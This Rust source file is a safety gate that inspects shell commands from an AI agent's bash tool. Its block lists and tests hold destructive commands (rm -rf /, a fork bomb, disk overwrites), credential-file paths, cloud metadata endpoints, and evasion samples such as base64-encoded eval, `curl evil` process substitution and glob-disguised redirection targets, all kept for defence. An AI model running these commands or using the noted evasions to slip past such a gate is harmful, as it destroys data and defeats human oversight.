//! Command-string safety analyzer for the bash runner.
//!
//! Pure (no I/O) gate that inspects a shell command string for dangerous
//! patterns, privilege escalation, password prompts, and redirections to
//! system-sensitive paths, plus the user-configured deny list and sandbox
//! workdir policy. Shared by the model `bash` tool, the `!` bang passthrough,
//! the `/test` slash command, and lifecycle hooks so every shell execution
//! goes through one gate. Extracted from `bash_runner` so the execution
//! half is process/IO and this half is static analysis.

use crate::shared::access::{DenyList, PathGuard};
use std::path::Path;

/// Dangerous shell commands. These are the exact raw-string patterns
/// checked before normalization; the safety check also scans the normalized
/// command with [`word_boundary_match`] so trivial evasions such as
/// `r'm -rf /'` or `chmod -R 777  /` are still caught.
const DANGEROUS_SHELL_COMMANDS: &[&str] = &[
    "rm -rf /",
    "rm -rf /*",
    "rm -fr /",
    "rm -fr /*",
    "rm --no-preserve-root -rf /",
    "rm --no-preserve-root -fr /",
    "rm -rf --no-preserve-root /",
    "rm -fr --no-preserve-root /",
    ":(){ :|:& };:",
    "> /dev/sda",
    "mkfs.",
    "dd if=/dev/zero of=",
    "dd if=/dev/random of=",
    "dd if=/dev/urandom of=",
    "chmod -R 777 /",
    "chmod 777 /",
    "chmod -R a+rwx /",
    "chmod a+rwx /",
    "chown -R root:root /",
    "chown root:root /",
    "dd if=/dev/random",
    "> /dev/null < /dev/sda",
];

/// Privilege-escalation commands. These require interactive authentication
/// or can switch users, so they are blocked in model-driven execution.
const PRIVILEGE_ESCALATION_COMMANDS: &[&str] = &["sudo", "su", "doas"];

/// Interactive password-prompt patterns. Blocking these prevents the model
/// from accidentally hanging on a hidden `read -s` or password utility.
const INTERACTIVE_PASSWORD_PATTERNS: &[&str] = &["read -s", "stty -echo", "passwd"];

/// Dangerous redirection prefixes. Any stdout overwrite or `tee` into these
/// system-sensitive directories is blocked regardless of approval state.
///
/// These are the exact raw-string patterns checked before normalization; the
/// safety check also scans the normalized command with
/// [`redirects_to_dangerous_path`] and [`tee_to_dangerous_path`] so spacing,
/// quoting, and Windows-path variants are caught as well.
const DANGEROUS_REDIRECTION_PATTERNS: &[&str] = &[
    "> /etc/",
    ">> /etc/",
    ">| /etc/",
    "> ~/.ssh/",
    ">> ~/.ssh/",
    ">| ~/.ssh/",
    "> /root/",
    ">> /root/",
    ">| /root/",
    "tee /etc/",
    "tee ~/.ssh/",
    "tee /root/",
    "> C:/Windows/",
    ">> C:/Windows/",
    "> C:\\Windows\\",
    ">> C:\\Windows\\",
    "> %SystemRoot%",
    ">> %SystemRoot%",
];

/// True if `pattern` appears in `cmd` at a word boundary (start/end of
/// string, whitespace, or shell metacharacter). Used so `rm -rf /` blocks
/// the exact dangerous command even when it appears inside a pipeline.
pub(super) fn word_boundary_match(cmd: &str, pattern: &str) -> bool {
    let boundaries = [' ', '\t', '\n', '|', ';', '&', '(', ')', '<', '>', '\0'];
    let p: Vec<char> = pattern.chars().collect();
    let chars: Vec<char> = cmd.chars().collect();
    let mut i = 0;
    while i + p.len() <= chars.len() {
        if chars[i..i + p.len()] == p {
            let start_ok = i == 0 || boundaries.contains(&chars[i - 1]);
            let end_ok = i + p.len() >= chars.len() || boundaries.contains(&chars[i + p.len()]);
            if start_ok && end_ok {
                return true;
            }
        }
        i += 1;
    }
    false
}

/// Normalize a shell command so that trivial quoting/whitespace/comment
/// evasions do not defeat the deny-list. This is a preprocessor, not a shell
/// parser: it removes comments (a `#` at start of input or after whitespace,
/// as in bash — a mid-word `#` is part of the token, so `foo#bar` survives
/// intact), strips single/double quotes, collapses whitespace, lowercases
/// alphabetic characters, and strips simple backslash escapes. Backticks are
/// intentionally left intact because they denote command substitution, which
/// the safety layer treats literally.
pub(crate) fn normalize_for_safety(cmd: &str) -> String {
    let mut out = String::with_capacity(cmd.len());
    let mut chars = cmd.chars().peekable();
    let mut in_single = false;
    let mut in_double = false;
    while let Some(c) = chars.next() {
        if in_single {
            if c == '\'' {
                in_single = false;
            } else {
                out.push(c.to_ascii_lowercase());
            }
            continue;
        }
        if in_double {
            if c == '"' {
                in_double = false;
            } else if c == '\\' {
                // Preserve the escaped character's literal value inside double
                // quotes so "r\"m -rf /" still normalizes to "rm -rf /".
                out.push(chars.next().unwrap_or(c).to_ascii_lowercase());
            } else {
                out.push(c.to_ascii_lowercase());
            }
            continue;
        }
        match c {
            '\'' => in_single = true,
            '"' => in_double = true,
            // Comment only where bash starts one: at start of input or after
            // whitespace. A mid-word `#` (foo#bar) is part of the token —
            // truncating there also dropped everything after it, blinding
            // the normalized-only gates (redirect/tee/deny-list scans) to
            // the real tokens (WO 48.19).
            '#' if out.is_empty() || out.ends_with(|c: char| c.is_ascii_whitespace()) => {
                break; // comment to end of line
            }
            '\\' => {
                // Strip simple backslash escapes outside quotes.
                if let Some(next) = chars.next() {
                    out.push(next.to_ascii_lowercase());
                }
            }
            c => out.push(c.to_ascii_lowercase()),
        }
    }
    // Collapse whitespace to single spaces and trim.
    out.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// True if the command uses shell parameter expansions that can inject
/// whitespace or other characters to evade the literal deny-list.
///
/// Examples caught here: `${IFS}`, `${IFS:- }`, `$IFS`, and ANSI-C quoting
/// `$'...'`. Bash expands `${IFS}` to a space (or the current field separator),
/// so `rm${IFS:- }-rf${IFS:- }/` becomes `rm -rf /` at execution time even
/// though the raw string never contains that literal.
///
/// WO 27.5 R2 also catches `$(` command substitution and backticks
/// `` ` ` `` here — both execute subcommands and can rebuild forbidden
/// tokens at runtime (`eval $(echo cm0gLXJmIC8K | base64 -d)`).
// ponytail: this deny-list is a TRIPWIRE, not a boundary. It narrows the
// obvious-payload surface; the real boundary is landlock (WO 27.1) which
// confines the filesystem blast radius, plus `--no-network` for exfiltration.
// $( and backticks also fire on legitimate bash (`echo $(date)`,
// `for x in $(ls)`), but the model bash gate is intentionally restrictive —
// operators who need unrestricted shell use the `!` passthrough or --docker.
// A determined payload still evades via encoding (base64/hex + eval) or
// variable indirection; catching that in a blocklist is theater
// (AGENTS.md §5). Upgrade path: an allowlist is the only non-theatrical
// command gate (WO 28.17 R2, deferred).
fn contains_shell_expansion_evasion(cmd: &str) -> bool {
    cmd.contains("${IFS")
        || cmd.contains("$IFS")
        || cmd.contains("$'")
        || cmd.contains("$(")
        || cmd.contains('`')
}

/// True if `b` is a shell token separator for redirection-target scanning.
fn is_shell_token_separator(b: u8) -> bool {
    matches!(
        b,
        b' ' | b'\t' | b'\n' | b'|' | b';' | b'&' | b'(' | b')' | b'<' | b'>' | b'`'
    )
}

/// Path prefixes that a model-driven shell should never be allowed to
/// overwrite, either via redirection or via `tee`. Includes Unix system paths,
/// raw block devices, Windows-style paths, and the Git-Bash/WSL mount forms
/// so the same gate works across platforms.
const DANGEROUS_REDIRECTION_TARGETS: &[&str] = &[
    "/etc/",
    "~/.ssh/",
    "/root/",
    "/home/",
    "/usr/",
    "/bin/",
    "/sbin/",
    "/lib/",
    "/lib64/",
    "/boot/",
    "/dev/sda",
    "/dev/hda",
    "/dev/nvme",
    "/dev/xvd",
    "/dev/vd",
    "/dev/mmcblk",
    "%systemroot%",
    "%userprofile%",
    "c:\\windows",
    "c:\\programdata",
    "c:\\users\\",
    "/c/windows/",
    "/mnt/c/windows/",
];

/// Glob metacharacters that `/bin/sh` expands in an unquoted redirection
/// target. A legitimate redirection target (`> /tmp/out.txt`, `> log.txt`)
/// contains none of these; their presence means the target is a shell glob
/// the static-prefix gate cannot expand — deny rather than risk a bypass
/// where `> /e[t]c/hosts` expands to `/etc/hosts` at exec time.
const GLOB_METACHARS: &[u8] = b"[]*?{}";

/// Static label returned when a redirection target contains unexpanded glob
/// metacharacters. Deny — the static gate cannot safely expand the glob, and
/// a legitimate redirection target never contains these bytes.
const GLOB_METACHAR_DENY: &str = "<glob-metacharacter>";

/// True if `target` contains a shell glob metacharacter (`[`, `]`, `*`, `?`,
/// `{`, `}`). Used to deny redirection/tee targets that would be expanded by
/// `/bin/sh` at execution time, bypassing the literal-prefix dangerous-path
/// gate (e.g. `> /e[t]c/hosts` → `/etc/hosts`).
fn target_has_glob_metachar(target: &str) -> bool {
    target.as_bytes().iter().any(|b| GLOB_METACHARS.contains(b))
}

/// True if the normalized command redirects output to a system-sensitive
/// path. This catches `> /etc/hosts`, `>>  /root/.bashrc`, `>|"~/.ssh"`,
/// `2>/etc/passwd`, `&> /dev/sda`, etc., including Windows paths seen
/// through Git-Bash/WSL mounts. Also denies any redirection target that
/// contains shell-glob metacharacters, since `/bin/sh` would expand it at
/// exec time and the static gate cannot safely do so.
fn redirects_to_dangerous_path(cmd: &str) -> Option<&'static str> {
    let normalized = normalize_for_safety(cmd);
    let bytes = normalized.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        // Detect output redirection operators, optionally prefixed by a fd
        // (`1>`, `2>`, `&>`) or the clobber form (`>|`).
        let op_len = if bytes[i] == b'>' {
            if i + 1 < bytes.len() && matches!(bytes[i + 1], b'>' | b'|') {
                2
            } else {
                1
            }
        } else if i + 1 < bytes.len()
            && (bytes[i].is_ascii_digit() || bytes[i] == b'&')
            && bytes[i + 1] == b'>'
        {
            2
        } else {
            0
        };

        if op_len == 0 {
            i += 1;
            continue;
        }

        // Find the redirection target, skipping whitespace.
        let mut j = i + op_len;
        while j < bytes.len() && bytes[j].is_ascii_whitespace() {
            j += 1;
        }
        let start = j;
        while j < bytes.len() && !is_shell_token_separator(bytes[j]) {
            j += 1;
        }
        let target = std::str::from_utf8(&bytes[start..j])
            .unwrap_or("")
            .to_lowercase();
        if target_has_glob_metachar(&target) {
            return Some(GLOB_METACHAR_DENY);
        }
        for prefix in DANGEROUS_REDIRECTION_TARGETS {
            if target.starts_with(prefix) || target == prefix.trim_end_matches('/') {
                return Some(*prefix);
            }
        }
        i = j;
    }
    None
}

/// True if the command uses `tee` to write to a system-sensitive path.
/// Also denies `tee` targets containing shell-glob metacharacters.
fn tee_to_dangerous_path(cmd: &str) -> Option<&'static str> {
    let normalized = normalize_for_safety(cmd);
    // Tokenize naively and look for a `tee` word followed by a dangerous path.
    // Flag tokens (`-a`, `-i`, `--append`, anything starting with `-`) sit
    // between `tee` and its target and must be skipped or the gate is blind
    // to `tee -a /etc/passwd` (WO 48).
    let tokens: Vec<&str> = normalized.split_whitespace().collect();
    for (i, tok) in tokens.iter().enumerate() {
        let is_tee = *tok == "tee"
            || tok.ends_with("|tee")
            || tok.ends_with(";tee")
            || tok.ends_with("&&tee")
            || tok.ends_with("||tee");
        if !is_tee {
            continue;
        }
        let mut j = i + 1;
        while j < tokens.len() && tokens[j].starts_with('-') {
            j += 1;
        }
        let target = tokens.get(j)?.to_lowercase();
        if target_has_glob_metachar(&target) {
            return Some(GLOB_METACHAR_DENY);
        }
        for prefix in DANGEROUS_REDIRECTION_TARGETS {
            if target.starts_with(prefix) || target == prefix.trim_end_matches('/') {
                return Some(*prefix);
            }
        }
    }
    None
}

/// Check a bash command against an allowlist (WO 32.18).
///
/// When `deny_list.bash_require_allowlist` is true, every clause of the
/// command must have its head (first token) prefix-match an entry in
/// `deny_list.bash_allowlist`, or the whole command is denied. Compound
/// commands (`&&`, `;`, `|`) require every clause to match. When false
/// (default) or the allowlist is empty, this is a no-op.
///
/// Returns `Some(reason)` naming the offending clause when denied, `None`
/// when allowed or the allowlist is not enforced.
///
/// ponytail: prefix-match on the head is the simplest non-theatrical
/// command gate. It does not parse shell syntax — a determined payload
/// can still evade via `eval`, variables, or encoding. The real boundary
/// remains landlock (WO 27.1); this allowlist is operator-curated
/// blast-radius narrowing for trusted-command environments.
fn check_bash_allowlist(cmd: &str, deny_list: &DenyList) -> Option<String> {
    if !deny_list.bash_require_allowlist || deny_list.bash_allowlist.is_empty() {
        return None;
    }
    // Normalize first so quoted heads and mixed whitespace collapse cleanly,
    // then split on the compound separators.
    let normalized = normalize_for_safety(cmd);
    let clauses = split_compound_clauses(&normalized);
    for clause in clauses {
        let head = match clause.split_whitespace().next() {
            Some(h) => h,
            None => continue, // empty clause (e.g. trailing `;`) — skip
        };
        let matched = deny_list
            .bash_allowlist
            .iter()
            .any(|prefix| head.starts_with(prefix.trim()));
        if !matched {
            return Some(format!(
                "🔒 Command blocked by bash allowlist: clause '{clause}' does not match any allowed prefix"
            ));
        }
    }
    None
}

/// Split a command string into clauses on `&&`, `||`, `;`, `|`, `\n`,
/// `\r`, and a lone `&` (the shell background/sequence separator).
/// Each returned clause is trimmed; empty clauses are dropped.
///
/// WO 38.1: newlines/CRs are separators to the shell, so they split clauses
/// here too. Existing callers pass `normalize_for_safety` output (whitespace
/// already collapsed), so this only changes behavior for raw-command callers
/// (permission rules).
///
/// WO 44.20: a lone `&` is now a separator too — otherwise `cargo test &
/// curl evil.com` is one clause and a `cargo test*` allow rule (or a `cargo`
/// bash allowlist entry) matches the whole string, auto-approving the
/// payload. The `&` is NOT a separator when it is part of a redirection
/// operator: `>&` or `&>` (`&` adjacent to `>` on either side, covering
/// `2>&1` and `>&file`), or the fd-dup digit-`&`-digit form. Splitting a
/// legitimate `cmd > f 2>&1` would fail-closed to Ask for allow rules; the
/// exception keeps it working.
///
/// ponytail: this split is quote-blind — a `|` or `&` inside quotes also
/// splits (pre-existing behavior for the other separators). It is not a
/// shell parser. The real boundary remains landlock (WO 27.1); this only
/// narrows the compound-clause bypass for the permission/allowlist layers,
/// which fail closed for allow rules.
pub(crate) fn split_compound_clauses(cmd: &str) -> Vec<String> {
    // The normalized command has collapsed whitespace, so separators are
    // always single-token. Replace each with a sentinel, then split.
    let mut s = cmd.to_string();
    for sep in ["&&", "||", ";", "|", "\n", "\r"] {
        s = s.replace(sep, "\u{0}");
    }
    // A lone `&` (background/sequence separator) is also a clause boundary,
    // EXCEPT inside a redirection operator: `>&`, `&>` (& adjacent to `>`),
    // or digit-`&`-digit (fd-dup form). `&&` was already replaced above, so
    // any remaining `&` is lone. `&` is ASCII so byte-neighbor checks are
    // byte-aligned; other chars are pushed verbatim to stay UTF-8 safe.
    let bytes = s.as_bytes();
    let mut out = String::with_capacity(s.len());
    for (i, c) in s.char_indices() {
        if c == '&' {
            let prev = if i > 0 { Some(bytes[i - 1]) } else { None };
            let next = if i + 1 < bytes.len() {
                Some(bytes[i + 1])
            } else {
                None
            };
            let part_of_redirect = prev == Some(b'>')
                || next == Some(b'>')
                || (prev.is_some_and(|p| p.is_ascii_digit())
                    && next.is_some_and(|n| n.is_ascii_digit()));
            out.push(if part_of_redirect { '&' } else { '\u{0}' });
        } else {
            out.push(c);
        }
    }
    out.split('\u{0}')
        .map(|c| c.trim().to_string())
        .filter(|c| !c.is_empty())
        .collect()
}

/// Safety check for a bash command. Returns `Some(reason)` if the command
/// should be blocked, `None` if it may proceed.
///
/// This is shared between the model's `bash` tool, the `!` bang passthrough,
/// the `/test` slash command, and lifecycle hooks so every shell execution
/// goes through the same sandbox, deny-list, and dangerous-pattern gates.
///
/// ponytail: the deny-list + dangerous-pattern scan here is a TRIPWIRE, not a
/// boundary. It narrows the obvious-payload surface and catches naive evasion
/// (`${IFS}`, `$()`), but a determined payload evades via encoding
/// (base64/hex + eval) or variable indirection — no substring/regex blocklist
/// can resolve runtime state. The real boundary is landlock filesystem
/// confinement (WO 27.1, default-on for Linux) which caps the blast radius to
/// allow-listed paths, plus `--no-network` (`unshare(CLONE_NEWNET)`) which
/// blocks exfiltration. Operators needing a non-theatrical command gate should
/// use an allowlist (`bash.require_allowlist`, WO 28.17 R2 — deferred), since
/// an allowlist is the only blocklist-shape that isn't theater.
pub fn check_bash_command_str(
    cmd: &str,
    workdir: Option<&str>,
    deny_list: &DenyList,
    path_guard: &PathGuard,
    bash_sandbox_workdir: bool,
) -> Option<String> {
    // 1. Sandboxed workdir policy. If enabled, reject an explicit workdir
    //    that points outside the sandbox. If we cannot canonicalize the path
    //    we deny: a non-canonical path containing `..` could pass the
    //    prefix check while resolving outside the sandbox.
    if bash_sandbox_workdir {
        if let Some(workdir) = workdir {
            if !workdir.is_empty() {
                let workdir_path = Path::new(workdir);
                let resolved = match workdir_path.canonicalize() {
                    Ok(p) => p,
                    Err(_) => {
                        return Some(format!(
                            "🔒 Bash workdir cannot be resolved: {workdir} (sandbox enforcement active)"
                        ));
                    }
                };
                if let Some(ref sandbox) = path_guard.sandbox_dir {
                    let sb = match sandbox.canonicalize() {
                        Ok(p) => p,
                        Err(_) => {
                            return Some(format!(
                                "🔒 Sandbox directory cannot be resolved: {}",
                                sandbox.display()
                            ));
                        }
                    };
                    if !resolved.starts_with(&sb) {
                        return Some(format!(
                            "🔒 Bash workdir outside sandbox: {} (sandbox: {})",
                            workdir,
                            sandbox.display()
                        ));
                    }
                }
            }
        }
    }

    // 2. Hard-coded metadata endpoint blocks.
    if cmd.contains("169.254.169.254")
        || cmd.contains("metadata.google")
        || cmd.contains("metadata.aws")
    {
        return Some("🔒 Command blocked: contains reference to metadata endpoints".into());
    }

    // 3. User-configured URL deny list.
    for url_prefix in &deny_list.url_patterns {
        if !url_prefix.is_empty() && cmd.contains(url_prefix) {
            return Some(format!(
                "🔒 Command blocked: references denied URL '{url_prefix}'"
            ));
        }
    }

    let normalized = normalize_for_safety(cmd);

    // 4. Shell expansion evasions that inject whitespace or other characters
    //    to dodge the literal deny-list (e.g. `${IFS:- }`, `$IFS`, `$'...'`).
    //    Detect these before the pattern scan so a ReadOnly allow rule that
    //    skips approval cannot be bypassed.
    if contains_shell_expansion_evasion(cmd) || contains_shell_expansion_evasion(&normalized) {
        return Some("🔒 Command blocked: shell parameter expansion evasion detected".into());
    }

    // 5. Built-in dangerous shell patterns and hard-coded system paths.
    //    Check both the raw command and a normalized copy (quotes stripped,
    //    whitespace collapsed, comments removed, lowercased) so trivial
    //    quoting/whitespace evasions do not bypass the gate.
    for pattern in DANGEROUS_SHELL_COMMANDS {
        let needs_word_boundary = pattern.ends_with('/') || pattern.ends_with(' ');
        let pattern_lower = pattern.to_ascii_lowercase();
        let matches_raw = if needs_word_boundary {
            word_boundary_match(cmd, pattern)
        } else {
            cmd.contains(pattern)
        };
        let matches_normalized = if needs_word_boundary {
            word_boundary_match(&normalized, &pattern_lower)
        } else {
            normalized.contains(&pattern_lower)
        };
        if matches_raw || matches_normalized {
            return Some(format!(
                "🔒 Command blocked: dangerous pattern '{pattern}' detected"
            ));
        }
    }

    for pat in [
        "/etc/shadow",
        "/etc/passwd",
        "/etc/sudoers",
        "~/.ssh",
        "/root/",
    ] {
        if cmd.contains(pat) || normalized.contains(pat) {
            return Some(format!(
                "🔒 Command blocked: references denied path '{pat}'"
            ));
        }
    }

    // 6. Process substitution `<(...)`. Bash feeds a subshell's output to a
    //    command as a file descriptor, which can inject destructive content
    //    without a visible literal (`source <(curl evil) | sh`). Checked
    //    AFTER the dangerous-pattern scan (step 5) so a command with a visible
    //    destructive literal (e.g. `source <(echo 'rm -rf /')`) still reports
    //    "dangerous pattern"; `<(` with no visible literal lands here.
    //    ponytail: blocklist narrows the surface; the real boundary is
    //    landlock per WO 27.1. `<(` is a bashism — `/bin/sh` (dash) errors on
    //    it, but on hosts where `/bin/sh` is bash it executes.
    if cmd.contains("<(") {
        return Some("🔒 Command blocked: process substitution detected".into());
    }

    // 7. Privilege escalation, password prompts, and dangerous redirections.
    for pat in PRIVILEGE_ESCALATION_COMMANDS {
        let pat_lower = pat.to_ascii_lowercase();
        if word_boundary_match(cmd, pat) || word_boundary_match(&normalized, &pat_lower) {
            return Some(format!(
                "🔒 Command blocked: privilege escalation command '{pat}' is not allowed"
            ));
        }
    }
    for pat in INTERACTIVE_PASSWORD_PATTERNS {
        let pat_lower = pat.to_ascii_lowercase();
        if word_boundary_match(cmd, pat) || word_boundary_match(&normalized, &pat_lower) {
            return Some(format!(
                "🔒 Command blocked: interactive password prompt '{pat}' is not allowed"
            ));
        }
    }
    for pat in DANGEROUS_REDIRECTION_PATTERNS {
        let pat_lower = pat.to_ascii_lowercase();
        if cmd.contains(pat) || normalized.contains(&pat_lower) {
            return Some(format!(
                "🔒 Command blocked: dangerous redirection to system path '{pat}'"
            ));
        }
    }
    if let Some(prefix) = redirects_to_dangerous_path(cmd) {
        return Some(format!(
            "🔒 Command blocked: dangerous redirection to system path '{prefix}'"
        ));
    }
    if let Some(prefix) = tee_to_dangerous_path(cmd) {
        return Some(format!(
            "🔒 Command blocked: dangerous redirection to system path '{prefix}'"
        ));
    }

    // 8. User-configured path deny list. Tokenize the command and check
    //    each token as a path, using normalized tokens so quoted paths are
    //    still evaluated.
    for token in normalized.split_whitespace() {
        if deny_list.is_path_denied(Path::new(token)) {
            return Some(format!(
                "🔒 Command blocked: references denied path '{token}'"
            ));
        }
    }

    // 9. Bash command allowlist (WO 32.18). When `require_allowlist` is
    //    true, every clause's head must prefix-match an allowed prefix.
    //    No-op when false (default) or the allowlist is empty.
    if let Some(reason) = check_bash_allowlist(cmd, deny_list) {
        return Some(reason);
    }

    None
}

/// JSON-args wrapper around [`check_bash_command_str`] for the model's
/// `bash` tool invocation path.
pub fn check_bash_command(
    args: &serde_json::Value,
    deny_list: &DenyList,
    path_guard: &PathGuard,
    bash_sandbox_workdir: bool,
) -> Option<String> {
    let cmd = args.get("command").and_then(|c| c.as_str()).unwrap_or("");
    let workdir = args.get("workdir").and_then(|w| w.as_str());
    check_bash_command_str(cmd, workdir, deny_list, path_guard, bash_sandbox_workdir)
}

#[cfg(test)]
mod private_tests {
    use super::*;

    // WO 28.1: moved from session/bash_runner/mod.rs — these are direct unit
    // tests for `word_boundary_match`, which relocated here with the rest of
    // the safety gate. Keep them next to the function they exercise.
    #[test]
    fn word_boundary_match_exact() {
        assert!(word_boundary_match("rm -rf /", "rm -rf /"));
    }

    #[test]
    fn word_boundary_no_false_positive_trailing_slash() {
        assert!(!word_boundary_match("rm -rf /home/user", "rm -rf /"));
    }

    #[test]
    fn word_boundary_match_with_pipe_prefix() {
        assert!(word_boundary_match("echo foo | rm -rf /", "rm -rf /"));
    }

    #[test]
    fn word_boundary_match_with_semicolon() {
        assert!(word_boundary_match("cd /; rm -rf /", "rm -rf /"));
    }

    #[test]
    fn word_boundary_no_match_in_substring() {
        assert!(!word_boundary_match("rm -rf /home", "rm -rf /"));
    }

    #[test]
    fn normalize_strips_single_quotes() {
        let n = normalize_for_safety("r'm -rf /'");
        assert!(n.contains("rm -rf /"));
    }

    #[test]
    fn normalize_strips_double_quotes() {
        let n = normalize_for_safety(r#"rm "-rf" /"#);
        assert!(n.contains("rm -rf /"));
    }

    #[test]
    fn normalize_strips_backslash_escape_outside_quotes() {
        let n = normalize_for_safety(r"rm\ -rf\ /");
        assert_eq!(n, "rm -rf /");
    }

    #[test]
    fn normalize_preserves_escaped_char_inside_double_quotes() {
        let n = normalize_for_safety("\"r\\\"m -rf /\"");
        assert!(n.contains("r\"m -rf /"), "got: {n}");
    }

    #[test]
    fn normalize_truncates_at_hash_comment() {
        let n = normalize_for_safety("echo hi # cleanup");
        assert_eq!(n, "echo hi");
    }

    // WO 48.19: a mid-word `#` is part of the token in bash (foo#bar is one
    // word). The normalizer used to truncate there, dropping the token tail
    // AND everything after it — blinding the normalized-only gates to the
    // real command.
    #[test]
    fn normalize_keeps_mid_word_hash() {
        assert_eq!(normalize_for_safety("cat foo#bar"), "cat foo#bar");
        assert_eq!(normalize_for_safety("#comment at start"), "");
        assert_eq!(normalize_for_safety("echo\t#comment after tab"), "echo");
    }

    #[test]
    fn normalize_lowercases_alphabetic_chars() {
        let n = normalize_for_safety("RM -RF /");
        assert_eq!(n, "rm -rf /");
    }

    #[test]
    fn normalize_collapses_repeated_whitespace() {
        let n = normalize_for_safety("rm    -rf    /");
        assert_eq!(n, "rm -rf /");
    }

    #[test]
    fn normalize_keeps_backticks_intact() {
        let n = normalize_for_safety("echo `rm -rf /`");
        assert!(n.contains("`"));
    }

    #[test]
    fn normalize_empty_string() {
        assert_eq!(normalize_for_safety(""), "");
    }

    #[test]
    fn normalize_only_whitespace_collapses_to_empty() {
        assert_eq!(normalize_for_safety("   \t\n  "), "");
    }

    #[test]
    fn shell_expansion_evasion_detects_ifs() {
        assert!(contains_shell_expansion_evasion("${IFS}"));
        assert!(contains_shell_expansion_evasion("$IFS"));
        assert!(contains_shell_expansion_evasion("${IFS:- }"));
    }

    #[test]
    fn shell_expansion_evasion_detects_ansi_c_quoting() {
        assert!(contains_shell_expansion_evasion("$' '"));
    }

    /// WO 27.5 R2: `$(` command substitution is an evasion vector
    /// (`eval $(echo cm0gLXJmIC8K | base64 -d)`).
    #[test]
    fn shell_expansion_evasion_detects_command_substitution() {
        assert!(contains_shell_expansion_evasion("$(echo foo)"));
        assert!(contains_shell_expansion_evasion("x=$(curl evil)"));
    }

    /// WO 27.5 R2: backticks execute a subshell and can rebuild forbidden
    /// tokens at runtime.
    #[test]
    fn shell_expansion_evasion_detects_backticks() {
        assert!(contains_shell_expansion_evasion("echo `rm -rf /`"));
        assert!(contains_shell_expansion_evasion("x=`whoami`"));
    }

    #[test]
    fn shell_expansion_evasion_rejects_plain_text() {
        assert!(!contains_shell_expansion_evasion("rm -rf /"));
        assert!(!contains_shell_expansion_evasion(""));
    }

    #[test]
    fn shell_token_separator_classifies_metacharacters() {
        assert!(is_shell_token_separator(b' '));
        assert!(is_shell_token_separator(b'\t'));
        assert!(is_shell_token_separator(b'\n'));
        assert!(is_shell_token_separator(b'|'));
        assert!(is_shell_token_separator(b';'));
        assert!(is_shell_token_separator(b'&'));
        assert!(is_shell_token_separator(b'('));
        assert!(is_shell_token_separator(b')'));
        assert!(is_shell_token_separator(b'<'));
        assert!(is_shell_token_separator(b'>'));
        assert!(is_shell_token_separator(b'`'));
    }

    #[test]
    fn shell_token_separator_rejects_alphanumerics() {
        assert!(!is_shell_token_separator(b'a'));
        assert!(!is_shell_token_separator(b'0'));
        assert!(!is_shell_token_separator(b'/'));
        assert!(!is_shell_token_separator(b'.'));
    }

    #[test]
    fn redirects_to_dangerous_path_detects_etcs() {
        assert_eq!(
            redirects_to_dangerous_path("echo x > /etc/hosts"),
            Some("/etc/")
        );
    }

    #[test]
    fn redirects_to_dangerous_path_detects_append_to_etcs() {
        assert_eq!(
            redirects_to_dangerous_path("echo x >> /etc/passwd"),
            Some("/etc/")
        );
    }

    #[test]
    fn redirects_to_dangerous_path_detects_clobber_to_ssh() {
        assert_eq!(
            redirects_to_dangerous_path("echo x >| ~/.ssh/config"),
            Some("~/.ssh/")
        );
    }

    #[test]
    fn redirects_to_dangerous_path_detects_fd_prefixed() {
        assert_eq!(
            redirects_to_dangerous_path("echo x 2> /etc/hosts"),
            Some("/etc/")
        );
        assert_eq!(
            redirects_to_dangerous_path("echo x &> /etc/hosts"),
            Some("/etc/")
        );
    }

    #[test]
    fn redirects_to_dangerous_path_detects_device() {
        assert_eq!(
            redirects_to_dangerous_path("dd if=/dev/zero > /dev/sda"),
            Some("/dev/sda")
        );
    }

    #[test]
    fn redirects_to_dangerous_path_returns_none_for_safe_target() {
        assert_eq!(redirects_to_dangerous_path("echo x > /tmp/out.txt"), None);
    }

    #[test]
    fn redirects_to_dangerous_path_returns_none_for_no_redirect() {
        assert_eq!(redirects_to_dangerous_path("ls -la"), None);
    }

    #[test]
    fn redirects_to_dangerous_path_normalizes_quotes_in_target() {
        assert_eq!(
            redirects_to_dangerous_path("echo x > '/etc/hosts'"),
            Some("/etc/")
        );
    }

    // WO 48.19: the mid-word-`#` truncation blinded this normalized-only
    // scan — `echo x >f#o; > /etc/hosts` normalized to just `echo x >f`, so
    // the second (dangerous) redirection vanished. If this fails, the
    // normalizer regressed to truncating at any `#`.
    #[test]
    fn redirects_to_dangerous_path_sees_past_mid_word_hash() {
        assert_eq!(
            redirects_to_dangerous_path("echo x >f#o; > /etc/hosts"),
            Some("/etc/")
        );
    }

    #[test]
    fn tee_to_dangerous_path_detects_tee_etc() {
        assert_eq!(
            tee_to_dangerous_path("echo x | tee /etc/hosts"),
            Some("/etc/")
        );
    }

    #[test]
    fn tee_to_dangerous_path_detects_tee_ssh() {
        assert_eq!(
            tee_to_dangerous_path("echo x | tee ~/.ssh/config"),
            Some("~/.ssh/")
        );
    }

    #[test]
    fn tee_to_dangerous_path_detects_after_semicolon() {
        assert_eq!(
            tee_to_dangerous_path("echo y; tee /etc/passwd"),
            Some("/etc/")
        );
    }

    #[test]
    fn tee_to_dangerous_path_returns_none_for_safe_target() {
        assert_eq!(tee_to_dangerous_path("echo x | tee /tmp/out.txt"), None);
    }

    #[test]
    fn tee_to_dangerous_path_returns_none_for_no_tee() {
        assert_eq!(tee_to_dangerous_path("ls -la"), None);
    }

    // ponytail: pin the glob-metacharacter redirection bypass (WO 43.38).
    // A shell-glob/character-class target like `> /e[t]c/hosts` or
    // `> /etc/host*` does not start with a literal dangerous prefix, so the
    // old gate missed it while `/bin/sh` expanded it to the real path at
    // exec. The gate now denies any redirection/tee target containing glob
    // metacharacters. If this test fails, the gate regressed to literal-prefix
    // matching and the bypass is back.
    #[test]
    fn redirects_to_dangerous_path_denies_glob_charclass_target() {
        assert_eq!(
            redirects_to_dangerous_path("echo x > /e[t]c/hosts"),
            Some("<glob-metacharacter>")
        );
    }

    #[test]
    fn redirects_to_dangerous_path_denies_glob_star_target() {
        assert_eq!(
            redirects_to_dangerous_path("echo x > /etc/host*"),
            Some("<glob-metacharacter>")
        );
    }

    #[test]
    fn redirects_to_dangerous_path_denies_glob_brace_target() {
        assert_eq!(
            redirects_to_dangerous_path("echo x > /etc/{hosts,passwd}"),
            Some("<glob-metacharacter>")
        );
    }

    #[test]
    fn redirects_to_dangerous_path_allows_safe_non_glob_target() {
        assert_eq!(redirects_to_dangerous_path("echo x > /tmp/out.txt"), None);
    }

    #[test]
    fn tee_to_dangerous_path_denies_glob_charclass_target() {
        assert_eq!(
